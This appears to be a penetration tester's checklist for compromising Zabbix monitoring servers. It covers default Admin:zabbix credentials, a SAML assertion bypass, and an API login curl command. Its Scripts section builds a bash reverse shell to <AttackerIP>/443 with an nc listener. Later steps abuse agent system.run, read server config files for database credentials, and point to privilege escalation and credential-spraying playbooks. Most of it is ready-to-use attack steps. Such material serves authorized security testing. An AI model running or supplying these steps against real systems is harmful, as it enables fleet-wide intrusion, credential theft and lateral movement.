# Zabbix

## Before I start
- [ ] /zabbix/ UI, agent 10050 / server 10051 in the scan
- [ ] Login Admin:zabbix (capital A); also "Sign in as guest" — read-only but reveals hosts/versions

## CVE-2022-23131 (SAML SSO builds only)
- [ ] SSO configured → forged SAML assertion with modified username = login as Admin
- [ ] searchsploit zabbix for the PoC

## Authenticated RCE (Scripts)
- [ ] Alerts → Scripts → new: type Script, command bash -c 'bash -i >& /dev/tcp/<AttackerIP>/443 0>&1', run on Zabbix agent
- [ ] Monitoring → Hosts → pick host → execute script
nc -lvnp 443
- [ ] Shell as zabbix agent user on the TARGET HOST — fleet-wide by design

## API path
curl -s http://target/zabbix/api_jsonrpc.php -H 'Content-Type: application/json' -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"zabbix"},"id":1}'
- [ ] auth token → script.create / script.execute without the UI

## No admin?
- [ ] Items with system.run[] + agent EnableRemoteCommands=1 → command exec on agents via item triggers

## Post-landing
cat /etc/zabbix/zabbix_server.conf
- [ ] DB creds, host inventory, IPMI creds, SNMP communities in the DB

## Next
- [ ] zabbix shell → sudo/SUID enum: :Pb linux-enum, :Pb sudo
- [ ] Looted communities/creds → network + reuse sweep: :Pb spraying
